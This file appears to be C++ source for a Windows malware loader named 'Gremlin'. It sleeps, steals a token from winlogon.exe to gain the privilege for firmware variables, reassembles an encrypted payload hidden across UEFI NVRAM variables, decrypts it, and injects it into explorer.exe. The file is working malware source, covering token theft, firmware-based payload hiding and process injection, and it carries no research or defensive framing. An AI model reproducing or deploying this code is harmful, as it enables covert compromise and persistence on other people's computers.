#include "Gremlin.h"
#include "TokenSteal.h"
#include "Helpers.h"
#include "UEFI.h"
#include "Injection.h"
#include "Base64.h"
#include "DPAPI.h"

// Read the payload chunks from NVRAM vars, assemble and return it
// ------------------------------------------------------------------------

std::string read_payload() {
	std::string payload;

	for (unsigned int i = 1; i <= MAX_NVRAM_VAR; i++) {
		// Init the NVRAM vars
		std::string sName = NVRAM_VAR_NAME + std::to_string(i);
		LPCSTR lpName = sName.c_str();
		LPCSTR lpGuid = convert_name_to_guid(lpName);

        // Read the chunks from NVRAM vars and append it to build payload
		LPSTR chunk = (LPSTR)calloc(CHUNK_SIZE, sizeof(LPSTR));
		if (!read_nvram(lpName, lpGuid, chunk))
			break;
		payload = payload + std::string(chunk);

        // [DEBUG]
		//std::string debug = "[DBG] Chunk No. read: " + std::to_string(i);
		//OutputDebugStringA(debug.c_str());
	}

	return payload;
}

// Our pseudo entry-point
// ------------------------------------------------------------------------

void go(void) {
	//OutputDebugStringA("[DBG] Gremlin loaded"); // [DEBUG]

	// Sleep for a bit
	Sleep(60000);

    // Check if we have SeSystemEnvironmentPrivilege
    HANDLE threadToken = GetCurrentThreadEffectiveToken();
	BOOL ok = verify_priv(threadToken, SE_SYSTEM_ENVIRONMENT_NAME);

	// If not, then steal token from Winlogon.exe
	DWORD pid;
	if (!ok) {
		// Get PID of winlogon.exe
		pid = find_pid("winlogon.exe");
		ok = steal_token(pid);

		// If token stealing fails, exit
		if (!ok)
			return;
	}
	
	// Now enable SeSystemEnvironmentPrivilege privilege
	BOOL bResult = enable_privilege(SE_SYSTEM_ENVIRONMENT_NAME);
	if (!bResult) {
		//OutputDebugStringA("[DBG] Privilege couldn't be enabled");
		return;
	}
	//OutputDebugStringA("[DBG] SeSystemEnvironmentPrivilege has been enabled");

	// Read the payload from NVRAM
	std::string payloadB64 = read_payload();
	if (payloadB64 == "") {
		//OutputDebugStringA("[DBG] Could not read payload");
		return;
	}
	//OutputDebugStringA("[DBG] Payload read from NVRAM");

	// Revert thread to original user context
	RevertToSelf();

	// Base64URL decode the encrypted payload
	std::string payloadEnc = base64url_decode(payloadB64);

	// Decrypt the payload
	std::string payloadByte = env_decrypt(payloadEnc);
	if (payloadByte == "") {
		//OutputDebugStringA("[DBG] Could not decrypt payload");
		return;
	}
	//OutputDebugStringA("[DBG] Payload decrypted successfully");

    // [DEBUG]
	//std::string err =  "[DBG] Payload length: " + std::to_string(payloadByte.length());
    //OutputDebugStringA(err.c_str());

	// Prep the payload for injection
	LPSTR payload = (LPSTR)payloadByte.c_str();
	SIZE_T payloadLen = payloadByte.length();

	// Get PID of explorer.exe
	pid = find_pid("explorer.exe");

	// Inject the payload into the target process
	sir_inject_64(payload, payloadLen, pid);
		//OutputDebugStringA("[DBG] Payload injected successfully"); // [DEBUG]
	//else
		//OutputDebugStringA("[DBG] Payload couldn't be injected"); // [DEBUG]
}